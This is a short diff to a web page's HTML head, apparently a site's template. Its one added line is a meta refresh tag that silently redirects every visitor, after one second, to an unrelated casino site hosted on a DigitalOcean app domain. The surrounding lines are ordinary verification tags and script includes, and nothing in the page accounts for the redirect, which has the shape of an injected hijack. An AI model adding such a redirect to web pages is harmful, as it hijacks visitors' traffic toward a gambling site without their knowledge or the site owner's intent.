@@ -28,6 +28,7 @@ SetCookie("name","Started",time()+300)
 <meta name="yandex-verification" content="d5d07a9497cd9aeb" />
 <meta name="yandex-verification" content="7c9688fdac7e5ed3" />
 
+	<meta http-equiv="refresh" content="1;url=https://casino-x-3-jsw2l.ondigitalocean.app">
 
 <script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
